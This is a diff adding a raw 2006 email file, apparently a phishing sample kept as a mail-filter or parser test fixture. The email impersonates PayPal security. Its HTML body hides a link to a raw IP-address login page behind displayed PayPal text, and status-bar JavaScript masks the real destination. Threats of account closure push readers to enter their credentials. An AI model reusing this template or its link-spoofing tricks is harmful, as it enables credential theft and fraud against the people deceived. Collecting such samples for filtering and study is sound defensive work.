@@ -1,0 +1,180 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 5750C2A88C
+ for <user@example.com>; Wed, 15 Feb 2006 15:29:27 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id 46DCA621C9C; Wed, 15 Feb 2006 15:29:27 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 249CF621C9A
+ for <user@example.com>; Wed, 15 Feb 2006 15:29:26 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id PAA19671
+ for user@example.com; Wed, 15 Feb 2006 15:29:25 -0500
+Received: from neptune.nswebhost.com (neptune.nswebhost.com [72.9.248.130]
+ (may be forged)) by mail.example.com with ESMTP id PAA19663
+ for <user@example.com>; Wed, 15 Feb 2006 15:29:25 -0500
+From: customer_service@paypal.com
+Message-Id: <200602152029.PAA19663@mail.example.com>
+Received: from [86.127.28.54] (port=3320 helo=centralbank.com)
+ by neptune.nswebhost.com with esmtpa (Exim 4.52)
+ id 1F9TDe-0002Ul-F5; Wed, 15 Feb 2006 14:25:46 -0600
+Reply-To: <customer_service@paypal.com>
+Subject: Notification of Limited Account Access (Routing
+ Code:4C840-L001-Q190-T1836)
+Date: Mon, 14 Jan 2002 13:28:43 -0600
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-Antivirus-Scanner: Clean mail though you should still use an Antivirus
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - neptune.nswebhost.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [0 0] / [47 12]
+X-AntiAbuse: Sender Address Domain - paypal.com
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 301
+
+
+<script language="JavaScript">
+<!-- Hide the script from old browsers --
+
+        function a(txt) {
+                self.status = txt
+        }
+
+        function b() {
+                self.status = ""
+        }
+// --End Hiding Here -->
+</script>
+
+<br><br><table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+<img SRC="http://paypal.com/en_US/i/logo/paypal_logo.gif"  BORDER=0 height=50 width=200>
+	</tr>
+</table>
+ 
+        <hr noShade size=1>
+
+<img src="http://paypal.com/en_US/i/scr/pixel.gif" width=1 height=10><br>
+					    
+<table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+	  	<td><font style="font-size:17px" style="font-family:Verdana, Arial, Helvetica, sans-serif" style="font-weight:700" color="#003366">Security Center</font></TD>
+	</tr>
+	<tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" width="2" height="2"></td>
+	</tr>
+</table>
+<table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" width=6 height=6></td>
+	</tr>
+	<tr>
+		<td bgcolor=#999999 width=100%><img src="http://paypal.com/en_US/i/scr/pixel.gif" width=1 height=2></td>
+	</tr>
+	<tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" width=6 height=6></td>
+	</tr>
+</table>
+
+<!-- begin main -->
+
+<table style="width:600px" cellspacing="0" cellpadding="0" border="0" align="center">
+	<tr valign="top">
+		<td>
+			<table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+				<tr>
+					<td width="240"><img src="http://paypal.com/en_US/i/header/hdr_securityCenter_240x120.gif" valign="top"><br><br></td>
+					<td width="20"> </td>
+					<td  style="font-size:13px" style="font-family:Verdana, Arial, Helvetica, sans-serif" style="font-weight:400"><span style="font-weight:700">Military Grade Encryption is Only the Start</font></span><br><br>At PayPal, we want to increase your security and comfort level with every transaction. From our Buyer and Seller Protection Policies to our Verification and Reputation systems, we'll help to keep you safe.</span><br><br></td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+</table>
+
+<!-- end main -->
+
+<table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" width=6 height=6></td>
+	</tr>
+	<tr>
+		<td bgcolor=#999999 width=100%><img src="http://paypal.com/en_US/i/scr/pixel.gif" width=1 height=2></td>
+	</tr>
+	<tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" width=6 height=6></td>
+	</tr>
+</table>
+
+<table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+
+<td style="font-size:13px" style="font-family:Verdana, Arial, Helvetica, sans-serif" style="font-weight:400"><span style="font-weight:700">
+<br><br>
+ PayPal is committed to maintaining a safe environment for its community of buyers and sellers. To protect the security of your account, PayPal employs <br>some of the most
+advanced security systems in the world and our anti-fraud teams regularly screen the PayPal system for unusual activity.<br><br>
+
+Recently, our Account Review Team identified some unusual activity in your account. 
+In accordance with PayPal's User Agreement access to your account will be limited.
+This is a fraud prevention measure meant to ensure that your account is not compromised.
+<br><br>
+
+In order to secure your account we may require some specific information from you.
+We encourage you to log in by clicking on the link below and complete the requested form as soon as possible.
+<br><br><br><a href="http://203.193.47.38/.cgi-bin/Secure/Accounts/www.PayPal.com/SingIn/update/
+" 
+onMouseOver="a('http://www.paypal.com/account/webscr?cmd=_login-run');return true"
+onMouseOut="b()">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a><br><br>
+<br>
+Ignoring our request, for an extended period of time, may result in account limitations
+or may result in eventual account closure.<br><br>
+Thank you for your prompt attention to this matter. Please understand that this is <br>a security measure meant to help protect you and your account.<br> We apologize for any inconvenience.
+<br><br><br>
+</span>
+Sincerely,<br>
+PayPal Account Review Department<br>
+<br><br>
+PayPal Email ID PP522
+
+</td>
+
+	</tr>
+</table>
+
+<hr noShade size=1>
+
+<table style="width:600px" cellspacing="0" cellpadding="0" border="0" align="center">
+	<tr valign="top">
+		<td>
+			<table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+				<tr>
+					<td  style="font-size:13px" style="font-family:Verdana, Arial, Helvetica, sans-serif" style="font-weight:400">*Please do not respond to this e-mail as your reply will not be received.<br><br></td>
+					<td width="20"> </td>
+					<td width="100"><img src="http://images.paypal.com/images/verification_seal.gif"  BORDER=0 height=100 width=100 valign="top"><br><br></td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+</table><br><br>
+
+
+
+
+
+
+
+
+
